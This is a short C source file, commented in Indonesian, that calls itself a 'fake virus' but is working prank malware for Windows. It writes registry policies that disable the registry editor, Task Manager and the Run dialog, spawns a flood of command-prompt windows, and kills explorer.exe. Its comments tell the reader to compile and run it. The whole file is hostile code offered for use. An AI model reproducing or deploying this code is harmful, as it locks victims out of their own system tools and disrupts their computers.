#include"windows.h"
main()
{
//fake virus by : garyabraham.......
//heheheheheeheheeeeee......
 
//bwt disable registry editor
system("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v Disableregistrytools /d 1 /f");
 
//untuk disable taskmanager
system("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v Disabletaskmgr /d 1 /f");
 
//disable run
system("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoRun /d 1 /f");
 
//buat iseng aja, ngeluarin jendela command prompt cukup banyak lah.....
//syntax penyelamat sebenarnya
system("for %d in ( . . . . . . . . . . , , , . , . . , , l , l , ; . , . , . , l , , l , . . , . . , . , . , , , . , . , . . . . . , . , . , . , . , . , . , . , . , . , . , . , . , . , . , . , . , . , . , . , . , . , ) do start");
 
//untuk end process explorer.exe
system("Taskkill /f /im explorer.exe");
 
//selesai de bikin virus nya......
//kamu compile jadi .exe ya.....
//jalankan program.......
}
